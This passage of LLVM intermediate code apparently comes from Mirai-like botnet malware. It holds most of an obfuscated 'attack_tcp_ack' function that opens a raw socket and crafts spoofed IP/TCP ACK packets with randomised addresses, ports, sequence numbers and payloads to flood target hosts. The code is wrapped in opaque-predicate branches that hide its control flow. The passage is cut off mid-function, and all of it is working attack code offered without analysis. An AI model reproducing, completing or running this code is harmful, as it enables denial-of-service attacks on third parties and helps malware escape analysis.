  br label %originalBB50
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %568

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %568

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %293, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %296

; <label>:123:                                    ; preds = %118
  %124 = load i32, i32* @x.23
  %125 = load i32, i32* @y.24
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %123
  %132 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %133 = load i8**, i8*** %11, align 8
  %134 = load i32, i32* %9, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8*, i8** %133, i64 %135
  store i8* %132, i8** %136, align 8
  %137 = load i8**, i8*** %11, align 8
  %138 = load i32, i32* %9, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds i8*, i8** %137, i64 %139
  %141 = load i8*, i8** %140, align 8
  %142 = bitcast i8* %141 to %struct.iphdr*
  store %struct.iphdr* %142, %struct.iphdr** %29, align 8
  %143 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i64 1
  %145 = bitcast %struct.iphdr* %144 to %struct.tcphdr*
  store %struct.tcphdr* %145, %struct.tcphdr** %30, align 8
  %146 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %147 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %146, i64 1
  %148 = bitcast %struct.tcphdr* %147 to i8*
  store i8* %148, i8** %31, align 8
  %149 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = and i8 %151, 15
  %153 = or i8 %152, 64
  store i8 %153, i8* %150, align 4
  %154 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %155 = bitcast %struct.iphdr* %154 to i8*
  %156 = load i8, i8* %155, align 4
  %157 = and i8 %156, -16
  %158 = or i8 %157, 5
  store i8 %158, i8* %155, align 4
  %159 = load i8, i8* %12, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 1
  store i8 %159, i8* %161, align 1
  %162 = load i32, i32* %26, align 4
  %163 = sext i32 %162 to i64
  %164 = add i64 40, %163
  %165 = trunc i64 %164 to i16
  %166 = call zeroext i16 @htons(i16 zeroext %165) #7
  %167 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 2
  store i16 %166, i16* %168, align 2
  %169 = load i16, i16* %13, align 2
  %170 = call zeroext i16 @htons(i16 zeroext %169) #7
  %171 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 3
  store i16 %170, i16* %172, align 4
  %173 = load i8, i8* %14, align 1
  %174 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 5
  store i8 %173, i8* %175, align 4
  %176 = load i8, i8* %15, align 1
  %177 = icmp ne i8 %176, 0
  %178 = load i32, i32* @x.23
  %179 = load i32, i32* @y.24
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %177, label %186, label %190

; <label>:186:                                    ; preds = %originalBBpart2
  %187 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %188 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 4
  store i16 %187, i16* %189, align 2
  br label %190

; <label>:190:                                    ; preds = %186, %originalBBpart2
  %191 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 6
  store i8 6, i8* %192, align 1
  %193 = load i32, i32* %28, align 4
  %194 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 8
  store i32 %193, i32* %195, align 4
  %196 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i32 0, i32 1
  %201 = load i32, i32* %200, align 4
  %202 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 9
  store i32 %201, i32* %203, align 4
  %204 = load i16, i16* %16, align 2
  %205 = call zeroext i16 @htons(i16 zeroext %204) #7
  %206 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 0
  store i16 %205, i16* %207, align 4
  %208 = load i16, i16* %17, align 2
  %209 = call zeroext i16 @htons(i16 zeroext %208) #7
  %210 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 1
  store i16 %209, i16* %211, align 2
  %212 = load i32, i32* %18, align 4
  %213 = trunc i32 %212 to i16
  %214 = call zeroext i16 @htons(i16 zeroext %213) #7
  %215 = zext i16 %214 to i32
  %216 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 2
  store i32 %215, i32* %217, align 4
  %218 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 4
  %220 = load i16, i16* %219, align 4
  %221 = and i16 %220, -241
  %222 = or i16 %221, 80
  store i16 %222, i16* %219, align 4
  %223 = load i8, i8* %20, align 1
  %224 = sext i8 %223 to i16
  %225 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = and i16 %224, 1
  %229 = shl i16 %228, 13
  %230 = and i16 %227, -8193
  %231 = or i16 %230, %229
  store i16 %231, i16* %226, align 4
  %232 = load i8, i8* %21, align 1
  %233 = sext i8 %232 to i16
  %234 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 4
  %236 = load i16, i16* %235, align 4
  %237 = and i16 %233, 1
  %238 = shl i16 %237, 12
  %239 = and i16 %236, -4097
  %240 = or i16 %239, %238
  store i16 %240, i16* %235, align 4
  %241 = load i8, i8* %22, align 1
  %242 = sext i8 %241 to i16
  %243 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 4
  %245 = load i16, i16* %244, align 4
  %246 = and i16 %242, 1
  %247 = shl i16 %246, 11
  %248 = and i16 %245, -2049
  %249 = or i16 %248, %247
  store i16 %249, i16* %244, align 4
  %250 = load i8, i8* %23, align 1
  %251 = sext i8 %250 to i16
  %252 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = and i16 %251, 1
  %256 = shl i16 %255, 10
  %257 = and i16 %254, -1025
  %258 = or i16 %257, %256
  store i16 %258, i16* %253, align 4
  %259 = load i8, i8* %24, align 1
  %260 = sext i8 %259 to i16
  %261 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 4
  %263 = load i16, i16* %262, align 4
  %264 = and i16 %260, 1
  %265 = shl i16 %264, 9
  %266 = and i16 %263, -513
  %267 = or i16 %266, %265
  store i16 %267, i16* %262, align 4
  %268 = load i8, i8* %25, align 1
  %269 = sext i8 %268 to i16
  %270 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 4
  %272 = load i16, i16* %271, align 4
  %273 = and i16 %269, 1
  %274 = shl i16 %273, 8
  %275 = and i16 %272, -257
  %276 = or i16 %275, %274
  store i16 %276, i16* %271, align 4
  %277 = call i32 @rand_next()
  %278 = and i32 %277, 65535
  %279 = trunc i32 %278 to i16
  %280 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %281 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %280, i32 0, i32 5
  store i16 %279, i16* %281, align 2
  %282 = load i8, i8* %22, align 1
  %283 = icmp ne i8 %282, 0
  br i1 %283, label %284, label %290

; <label>:284:                                    ; preds = %190
  %285 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %286 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %285, i32 0, i32 4
  %287 = load i16, i16* %286, align 4
  %288 = and i16 %287, -2049
  %289 = or i16 %288, 2048
  store i16 %289, i16* %286, align 4
  br label %290

; <label>:290:                                    ; preds = %284, %190
  %291 = load i8*, i8** %31, align 8
  %292 = load i32, i32* %26, align 4
  call void @rand_str(i8* %291, i32 %292)
  br label %293

; <label>:293:                                    ; preds = %290
  %294 = load i32, i32* %9, align 4
  %295 = add nsw i32 %294, 1
  store i32 %295, i32* %9, align 4
  br label %118

; <label>:296:                                    ; preds = %118
  %297 = load i32, i32* @x.23
  %298 = load i32, i32* @y.24
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %296
  %305 = load i32, i32* @x.23
  %306 = load i32, i32* @y.24
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %313

; <label>:313:                                    ; preds = %567, %originalBBpart244
  %314 = load i32, i32* @x.23
  %315 = load i32, i32* @y.24
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %313
  store i32 0, i32* %9, align 4
  %322 = load i32, i32* @x.23
  %323 = load i32, i32* @y.24
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %330

; <label>:330:                                    ; preds = %564, %originalBBpart248
  %331 = load i32, i32* %9, align 4
  %332 = load i8, i8* %5, align 1
  %333 = zext i8 %332 to i32
  %334 = icmp slt i32 %331, %333
  br i1 %334, label %335, label %567

; <label>:335:                                    ; preds = %330
  %336 = load i8**, i8*** %11, align 8
  %337 = load i32, i32* %9, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds i8*, i8** %336, i64 %338
  %340 = load i8*, i8** %339, align 8
  store i8* %340, i8** %32, align 8
  %341 = load i8*, i8** %32, align 8
  %342 = bitcast i8* %341 to %struct.iphdr*
  store %struct.iphdr* %342, %struct.iphdr** %33, align 8
  %343 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i64 1
  %345 = bitcast %struct.iphdr* %344 to %struct.tcphdr*
  store %struct.tcphdr* %345, %struct.tcphdr** %34, align 8
  %346 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %347 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %346, i64 1
  %348 = bitcast %struct.tcphdr* %347 to i8*
  store i8* %348, i8** %35, align 8
  %349 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %350 = load i32, i32* %9, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %349, i64 %351
  %353 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %352, i32 0, i32 2
  %354 = load i8, i8* %353, align 4
  %355 = zext i8 %354 to i32
  %356 = icmp slt i32 %355, 32
  br i1 %356, label %357, label %378

; <label>:357:                                    ; preds = %335
  %358 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %359 = load i32, i32* %9, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %358, i64 %360
  %362 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %361, i32 0, i32 1
  %363 = load i32, i32* %362, align 4
  %364 = call i32 @ntohl(i32 %363) #7
  %365 = call i32 @rand_next()
  %366 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %367 = load i32, i32* %9, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %366, i64 %368
  %370 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %369, i32 0, i32 2
  %371 = load i8, i8* %370, align 4
  %372 = zext i8 %371 to i32
  %373 = lshr i32 %365, %372
  %374 = add i32 %364, %373
  %375 = call i32 @htonl(i32 %374) #7
  %376 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i32 0, i32 9
  store i32 %375, i32* %377, align 4
  br label %378

; <label>:378:                                    ; preds = %357, %335
  %379 = load i32, i32* @x.23
  %380 = load i32, i32* @y.24
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %378
  %387 = load i32, i32* %28, align 4
  %388 = icmp eq i32 %387, -1
  %389 = load i32, i32* @x.23
  %390 = load i32, i32* @y.24
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %388, label %397, label %401

; <label>:397:                                    ; preds = %originalBBpart252
  %398 = call i32 @rand_next()
  %399 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %400 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %399, i32 0, i32 8
  store i32 %398, i32* %400, align 4
  br label %401

; <label>:401:                                    ; preds = %397, %originalBBpart252
  %402 = load i16, i16* %13, align 2
  %403 = zext i16 %402 to i32
  %404 = icmp eq i32 %403, 65535
  br i1 %404, label %405, label %411

; <label>:405:                                    ; preds = %401
  %406 = call i32 @rand_next()
  %407 = and i32 %406, 65535
  %408 = trunc i32 %407 to i16
  %409 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 3
  store i16 %408, i16* %410, align 4
  br label %411

; <label>:411:                                    ; preds = %405, %401
  %412 = load i16, i16* %16, align 2
  %413 = zext i16 %412 to i32
  %414 = icmp eq i32 %413, 65535
  br i1 %414, label %415, label %421

; <label>:415:                                    ; preds = %411
  %416 = call i32 @rand_next()
  %417 = and i32 %416, 65535
  %418 = trunc i32 %417 to i16
  %419 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 0
  store i16 %418, i16* %420, align 4
  br label %421

; <label>:421:                                    ; preds = %415, %411
  %422 = load i32, i32* @x.23
  %423 = load i32, i32* @y.24
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %421
  %430 = load i16, i16* %17, align 2
  %431 = zext i16 %430 to i32
  %432 = icmp eq i32 %431, 65535
  %433 = load i32, i32* @x.23
  %434 = load i32, i32* @y.24
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %432, label %441, label %463

; <label>:441:                                    ; preds = %originalBBpart256
  %442 = load i32, i32* @x.23
  %443 = load i32, i32* @y.24
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %441
  %450 = call i32 @rand_next()
  %451 = and i32 %450, 65535
  %452 = trunc i32 %451 to i16
  %453 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %454 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %453, i32 0, i32 1
  store i16 %452, i16* %454, align 2
  %455 = load i32, i32* @x.23
  %456 = load i32, i32* @y.24
  %457 = sub i32 %455, 1
  %458 = mul i32 %455, %457
  %459 = urem i32 %458, 2
  %460 = icmp eq i32 %459, 0
  %461 = icmp slt i32 %456, 10
  %462 = or i1 %460, %461
  br i1 %462, label %originalBBpart271, label %originalBB58alteredBB

originalBBpart271:                                ; preds = %originalBB58
  br label %463

; <label>:463:                                    ; preds = %originalBBpart271, %originalBBpart256
  %464 = load i32, i32* @x.23
  %465 = load i32, i32* @y.24
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %463
  %472 = load i32, i32* %18, align 4
  %473 = icmp eq i32 %472, 65535
  %474 = load i32, i32* @x.23
  %475 = load i32, i32* @y.24
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br i1 %473, label %482, label %486

; <label>:482:                                    ; preds = %originalBBpart275
  %483 = call i32 @rand_next()
  %484 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %485 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %484, i32 0, i32 2
  store i32 %483, i32* %485, align 4
  br label %486

; <label>:486:                                    ; preds = %482, %originalBBpart275
  %487 = load i32, i32* @x.23
  %488 = load i32, i32* @y.24
  %489 = sub i32 %487, 1
  %490 = mul i32 %487, %489
  %491 = urem i32 %490, 2
  %492 = icmp eq i32 %491, 0
  %493 = icmp slt i32 %488, 10
  %494 = or i1 %492, %493
  br i1 %494, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %486
  %495 = load i32, i32* %19, align 4
  %496 = icmp eq i32 %495, 65535
  %497 = load i32, i32* @x.23
  %498 = load i32, i32* @y.24
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br i1 %496, label %505, label %509

; <label>:505:                                    ; preds = %originalBBpart279
  %506 = call i32 @rand_next()
  %507 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %508 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %507, i32 0, i32 3
  store i32 %506, i32* %508, align 4
  br label %509

; <label>:509:                                    ; preds = %505, %originalBBpart279
  %510 = load i8, i8* %27, align 1
  %511 = icmp ne i8 %510, 0
  br i1 %511, label %512, label %515

; <label>:512:                                    ; preds = %509
  %513 = load i8*, i8** %35, align 8
  %514 = load i32, i32* %26, align 4
  call void @rand_str(i8* %513, i32 %514)
  br label %515

; <label>:515:                                    ; preds = %512, %509
  %516 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %517 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %516, i32 0, i32 7
  store i16 0, i16* %517, align 2
  %518 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %519 = bitcast %struct.iphdr* %518 to i16*
  %520 = call zeroext i16 @checksum_generic(i16* %519, i32 20)
  %521 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %522 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %521, i32 0, i32 7
  store i16 %520, i16* %522, align 2
  %523 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %524 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %523, i32 0, i32 6
  store i16 0, i16* %524, align 4
  %525 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %526 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %527 = bitcast %struct.tcphdr* %526 to i8*
